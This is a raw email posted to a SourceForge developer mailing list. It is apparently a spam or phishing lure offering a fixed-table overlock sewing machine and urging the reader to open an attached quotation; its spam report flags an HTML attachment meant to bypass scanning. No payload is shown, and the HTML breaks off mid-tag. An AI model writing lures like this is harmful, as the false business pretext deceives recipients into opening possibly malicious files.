Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 0B1D2241F30
	for <lists+industrypack-devel@lfdr.de>; Tue, 11 Aug 2020 19:28:06 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1k5Y4C-00048X-RF
	for lists+industrypack-devel@lfdr.de; Tue, 11 Aug 2020 17:28:04 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from
 <bounces+2503710-02ef-industrypack-devel=lists.sourceforge.net@en.shieldpremiumpaintgh.com>)
 id 1k5Y4B-00048R-MX
 for industrypack-devel@lists.sourceforge.net; Tue, 11 Aug 2020 17:28:03 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=b58FTKnuTXPMvnOCXci/oPDnJZzEGoHQ/Zr+v6t9I0A=; b=dSKI/fmKEJF7pZJHApUyRnogVh
 T+uTR+qFlRknulw2D1xDFPiOXSq55qX9WktjrSJiHwSf9pFx8K8F1RpFClgJhEVoHmSzMw4mucVmg
 6u5izHB6l97EkO6cY+vfwDGb3lR6ynyrVW91W545sWJvMrfHW0PVYaMXoGGvzbgLXtZE=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=b58FTKnuTXPMvnOCXci/oPDnJZzEGoHQ/Zr+v6t9I0A=; b=J
 xHI4ZTp7cl7QzkNRYhJ4FMGnsdSjYbcx/h1scliZ8pcVV3psX0W1QZOI4dBxhXBex4W/QiO/0oEN6
 16f5FDGngN1VwJ4flsG3dZF3F53Sc5erh8UqF7yy4iISUSPzVV9Rbali5oMahmtwnrs+gQgFXlcaT
 b/f4bvi9lhB9yehU=;
Received: from wrqvqqcr.outbound-mail.sendgrid.net ([149.72.68.197])
 by sfi-mx-3.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
 id 1k5Y4A-006bfw-6M
 for industrypack-devel@lists.sourceforge.net; Tue, 11 Aug 2020 17:28:03 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; 
 d=shieldpremiumpaintgh.com; 
 h=from:to:subject:mime-version:content-type; s=s1; 
 bh=b58FTKnuTXPMvnOCXci/oPDnJZzEGoHQ/Zr+v6t9I0A=; b=gOZdYoKivsmgD
 D8esh/6Ei9P3fbanGu0ybg0ddaD4Cd9VohW0LcBCbZW5vmmigX4vLipMGee3UqFW
 IyFyXpGvKZ3m7uRZ7vlkJOQPpHvtOtl0gHrsTR0zq+b4rMc4YdhiZ9fubiD67xAz
 tHapQWneFhQoT3JRgyoUMBFmfkFSzM=
Received: by filter2040p1mdw1.sendgrid.net with SMTP id
 filter2040p1mdw1-18993-5F32D51C-10
 2020-08-11 17:27:56.3198647 +0000 UTC m=+590659.227588756
Received: from congoactuel.com (unknown)
 by geopod-ismtpd-5-3 (SG) with ESMTP id oNcPwkpMTa2ozNNeu7Cv9g
 for <industrypack-devel@lists.sourceforge.net>;
 Tue, 11 Aug 2020 17:27:56.258 +0000 (UTC)
From: Ivan Lo | Wiloggroup <contact@congoactuel.com>
To: industrypack-devel@lists.sourceforge.net
Date: Tue, 11 Aug 2020 17:27:56 +0000 (UTC)
Message-ID: <20200812023237.1C3322B1062A21AF@congoactuel.com>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_931161EF.5CC5FE30"
X-SG-EID: Lh/WjnkRAypzKdDw3F8O/Bro5dqTeLXebJfrLQ05rzgMjn3BU9c0UER8tSqFfn/57phE/v4FO956Go
 wboo0KuJMEOQGhYyq/jU80lwZAY8HjuGblJVX4mDHZLOPvmVYfQ0OpS0eCxsSps/MCe9Ix1J0F4RDp
 /qQEwxPSZOo8OriAEvNpDHWpADJvdsy9FnRlXunisl0qK/1Q6xEUwrv6gGFihXN5egE45xxzUzO5Qh
 ++7X+cIRnrCjIovo7URXYtQISQWYRL07M+jQnpnoFcnA==
X-Spam-Score: 4.6 (++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: ntkomanda.lt]
 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
 [Blocked - see <https://www.spamcop.net/bl.shtml?149.72.68.197>]
 0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
 domains are different
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or identical to
 background
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 0.0 UNPARSEABLE_RELAY Informational: message has unparseable relay lines
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
 0.1 AWL AWL: Adjusted score from AWL reputation of From: address
X-Headers-End: 1k5Y4A-006bfw-6M
Subject: [Industrypack-devel] Quotation sheet for EFB-CS 20200609
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.
------=_NextPart_000_0012_931161EF.5CC5FE30
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19541"></HEAD>
<body>
<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
 TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
ebkit-font-smoothing: antialiased;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial' align=3Dleft><FONT style=3D"-webkit-font-smoothing: antialiased" face=
=3DCalibri><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing: =
antialiased"><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing=
: antialiased">good afternoon!</FONT></FONT></FONT></P>
<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
 TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
ebkit-font-smoothing: antialiased;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial' align=3Dleft><FONT style=3D"-webkit-font-smoothing: antialiased" face=
=3DCalibri></FONT></P>
<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
 TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
ebkit-font-smoothing: antialiased;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial' align=3Dleft><FONT style=3D"-webkit-font-smoothing: antialiased" face=
=3DCalibri><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing: =
antialiased"><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing=
: antialiased">EFB-CS, fixed table overlock sewing machine</FONT></FONT></F=
ONT></P>
<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
 TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
ebkit-font-smoothing: antialiased;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial' align=3Dleft><FONT style=3D"-webkit-font-smoothing: antialiased" face=
=3DCalibri><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing: =
antialiased"><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing=
: antialiased">Price: US$5900/Unit FOB Ningbo</FONT></FONT></FONT><FONT sty=
le=3D"-webkit-font-smoothing: antialiased" face=3DCalibri>
<BR style=3D"-webkit-font-smoothing: antialiased"></FONT></P>
<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
 TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
ebkit-font-smoothing: antialiased;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial' align=3Dleft><FONT style=3D"-webkit-font-smoothing: antialiased" face=
=3DCalibri><BR style=3D"-webkit-font-smoothing: antialiased">&nbsp;</FONT><=
/P>
<DIV style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: "Microsoft Yah=
ei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Rob=
oto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
FORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; FO=
NT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-=
LEFT: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=20
normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
: 0px; -webkit-font-smoothing: antialiased; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-style: initial; text-decoration-color: initial; font-variant-numeric: inhe=
rit; font-variant-east-asian: inherit; font-stretch: inherit'></DIV>
<OL style=3D'MARGIN-BOTTOM: 0px; FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Y=
ahei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, R=
oboto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE:=
 normal; ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; LETTER-SPACING: normal; BA=
CKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -webkit-font-smoothing:=
 antialiased; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial'>
<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
inherit; -webkit-font-smoothing: antialiased">Automatic deceleration of cor=
ners: YES</FONT></FONT></FONT></LI>
<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
inherit; -webkit-font-smoothing: antialiased">Head: SINGER 300U</FONT></FON=
T></FONT></LI>
<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
inherit; -webkit-font-smoothing: antialiased">Lifting range of worktable: 1=
40mm</FONT></FONT></FONT></LI>
<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
inherit; -webkit-font-smoothing: antialiased">Workbench size: 1600x2000mm</=
FONT></FONT></FONT></LI>
<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
inherit; -webkit-font-smoothing: antialiased">Table lifting form: automatic=
</FONT></FONT></FONT></LI>
<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
inherit; -webkit-font-smoothing: antialiased">Overlock mattress thickness: =
30-450mm</FONT></FONT></FONT></LI>
<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
inherit; -webkit-font-smoothing: antialiased">Production efficiency (pcs/ho=
ur): 10-20</FONT></FONT></FONT></LI>
<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
inherit; -webkit-font-smoothing: antialiased">Total motor power: 1.2KW</FON=
T></FONT></FONT></LI>
<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
inherit; -webkit-font-smoothing: antialiased">Voltage: 220V, 1P, 50HZ</FONT=
></FONT><BR style=3D"-webkit-font-smoothing: antialiased"></FONT></LI></OL>
<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
 TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
ebkit-font-smoothing: antialiased;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial' align=3Dleft><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoo=
thing: antialiased"><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-sm=
oothing: antialiased">Our quotation is for standard models and voltage "220=
V, 1P, 50HZ", if you need to customize, please inform us in time.</FONT></F=
ONT><BR style=3D"-webkit-font-smoothing: antialiased">
<BR style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-A=
LIGN: inherit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL=
-ALIGN: inherit; -webkit-font-smoothing: antialiased">Attached is the quota=
tion, please check it and wait for your reply, thank you</FONT></FONT><BR s=
tyle=3D"-webkit-font-smoothing: antialiased"></P>
<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
 TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
ebkit-font-smoothing: antialiased;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial' align=3Dleft></P>
<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
 TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
ebkit-font-smoothing: antialiased;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial' align=3Dleft></P>
<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
 TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
ebkit-font-smoothing: antialiased;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial' align=3Dleft><A style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-=
ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
 PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px; -web=
kit-font-smoothing: antialiased" name=3Dx__GoBack>
<SPAN lang=3DEN-US style=3D"FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: =
inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; C=
OLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0=
px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialias=
ed; font-stretch: inherit"><FONT style=3D"-webkit-font-smoothing: antialias=
ed" face=3DCalibri>Best regards!</FONT></SPAN></A></P>
<DIV style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: "Microsoft Yah=
ei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Rob=
oto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
FORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; FO=
NT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-=
LEFT: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=20
normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
: 0px; -webkit-font-smoothing: antialiased; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-style: initial; text-decoration-color: initial; font-variant-numeric: inhe=
rit; font-variant-east-asian: inherit; font-stretch: inherit'></DIV>
<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
 TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
ebkit-font-smoothing: antialiased;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial' align=3Dleft></P>
<DIV style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: "Microsoft Yah=
ei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Rob=
oto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
FORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; FO=
NT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-=
LEFT: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=20
normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
: 0px; -webkit-font-smoothing: antialiased; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-style: initial; text-decoration-color: initial; font-variant-numeric: inhe=
rit; font-variant-east-asian: inherit; font-stretch: inherit'></DIV>
<DIV style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: "Microsoft Yah=
ei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Rob=
oto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
FORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; FO=
NT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-=
LEFT: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=20
normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
: 0px; -webkit-font-smoothing: antialiased; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-style: initial; text-decoration-color: initial; font-variant-numeric: inhe=
rit; font-variant-east-asian: inherit; font-stretch: inherit'>
<DIV class=3Dx_MsoNormal style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTI=
CAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; TEXT=
-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0cm 0cm 0pt; BOR=
DER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased" ali=
gn=3Dleft>
<DIV class=3Dx_MsoNormal style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTI=
CAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; TEXT=
-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0cm 0cm 0pt; BOR=
DER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased" ali=
gn=3Dleft>
<P class=3Dx_MsoNormal style=3D"TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; -web=
kit-font-smoothing: antialiased" align=3Dleft><SPAN style=3D"BORDER-TOP: 0p=
x; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: =
; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BO=
RDER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased">
<SPAN lang=3DEN-US style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-AL=
IGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TO=
P: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0p=
x; -webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-font-smoothi=
ng: antialiased" face=3DCalibri>2020-08-06</FONT></SPAN></SPAN></P></DIV>
<P class=3Dx_MsoNormal style=3D"TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; -web=
kit-font-smoothing: antialiased" align=3Dleft><SPAN style=3D"BORDER-TOP: 0p=
x; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: =
